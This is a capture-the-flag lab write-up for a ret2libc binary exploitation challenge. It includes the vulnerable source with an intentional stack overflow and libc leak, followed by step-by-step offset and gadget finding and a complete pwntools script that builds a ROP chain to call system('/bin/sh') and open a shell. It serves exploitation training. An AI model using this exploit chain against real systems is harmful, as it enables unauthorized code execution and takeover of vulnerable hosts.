# Challenge 05: House_of_Calls - ret2libc

**Difficulty**: ★★★★☆ Hard  
**Binary**: `house_of_calls`  
**Port**: 1341  
**Category**: Binary Exploitation / ret2libc / Stack Alignment

## Description

No `win()` function exists. The binary leaks `puts@GOT` (a libc address). You must calculate libc base, find `system()` and `/bin/sh` in libc, and build a ROP chain to call `system("/bin/sh")`.

**Base Image**: Ubuntu 20.04 (glibc 2.31) - different libc for learning.

## Source Code Analysis

```c
void vulnerable(void)
{
    char buffer[64];
    
    // Leak puts@GOT
    printf("Leak: %p\n", (void*)puts);
    
    read(0, buffer, 256);
}
```

### Vulnerabilities

1. **Information Leak**: Prints `puts@GOT` address (libc function pointer)
2. **Buffer Overflow**: `read(0, buffer, 256)` into 64-byte buffer

## Binary Protections

```bash
$ checksec --file=house_of_calls
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

- **No PIE** - Binary addresses static
- **ASLR enabled** - Libc base randomized
- **NX enabled** - Need ROP

## Exploitation: ret2libc

### Step 1: Receive Libc Leak

```bash
$ ./house_of_calls
Leak: 0x7f1234567890
```

This is the runtime address of `puts` in libc.

### Step 2: Calculate Libc Base

```bash
# On the target system (or same libc version)
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " puts"
# Example: 0x0000000000084420 puts

# Libc base = leak - puts_offset
libc_base = 0x7f1234567890 - 0x84420 = 0x7f12344e3470
```

### Step 3: Find Targets in Libc

```bash
# system offset
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
# Example: 0x0000000000052290 system

# /bin/sh string
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# Example: 1b3e9a /bin/sh
```

Runtime addresses:
- `system = libc_base + 0x52290`
- `binsh = libc_base + 0x1b3e9a`

### Step 4: Find ROP Gadgets

Need `pop rdi; ret` gadget. Can be from binary (no PIE) or libc.

```bash
ROPgadget --binary house_of_calls | grep "pop rdi"
# Or from libc:
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi"
```

### Step 5: Stack Alignment (Critical!)

On x86-64 glibc 2.27+, `system()` uses `movaps` requiring 16-byte stack alignment.
If your chain crashes in `do_system`/`movaps`, add a `ret` gadget before `system`.

```
Stack before system call must be 16-byte aligned.
Each stack entry is 8 bytes.
After pop rdi; ret chain: RSP points to system address.
If RSP % 16 == 8, misaligned! Add extra 'ret' to align.
```

### Step 6: Build ROP Chain

```
Offset: 72 bytes (64 buffer + 8 RBP)

Payload:
[A * 72]                    # Padding to RIP
[ret_gadget]                # Stack alignment (if needed)
[pop_rdi; ret]              # Gadget
[binsh_addr]                # Argument for system
[system_addr]               # Call system("/bin/sh")
```

### Exploit Script (pwntools)

```python
from pwn import *

elf = ELF('./house_of_calls')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Ubuntu 20.04 libc
p = process('./house_of_calls')
# p = remote('localhost', 1341)

# 1. Receive leak
p.recvuntil(b"Leak: ")
leak = int(p.recvline().strip(), 16)
log.success(f"puts@GOT: {hex(leak)}")

# 2. Calculate libc base
libc.address = leak - libc.symbols['puts']
log.success(f"Libc base: {hex(libc.address)}")

# 3. Get targets
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
log.info(f"system: {hex(system_addr)}")
log.info(f"/bin/sh: {hex(binsh_addr)}")

# 4. Find gadgets
rop = ROP([elf, libc])
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

# 5. Build payload
offset = 72
payload = b'A' * offset
payload += p64(ret_gadget)          # Stack alignment
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# 6. Send and win
p.sendline(payload)
p.interactive()
```

## Flag

Successful exploit gives interactive shell. Read flag.txt.

## Key Concepts Learned

- ret2libc: Using libc functions without binary symbols
- Libc base resolution from GOT leak
- Finding `/bin/sh` string in libc
- 16-byte stack alignment for `system()` on modern glibc
- Multi-stage ROP chaining

## Progressive Hints

1. No `win()` function. Where else is `system()`? Check libc.
2. Libc contains `/bin/sh` string - you don't need to provide it.
3. Crashing on `movaps`? Stack misaligned. Add a `ret` gadget before `pop rdi`.
4. Use pwntools `ELF` and `ROP` objects for automatic offset/gadget resolution.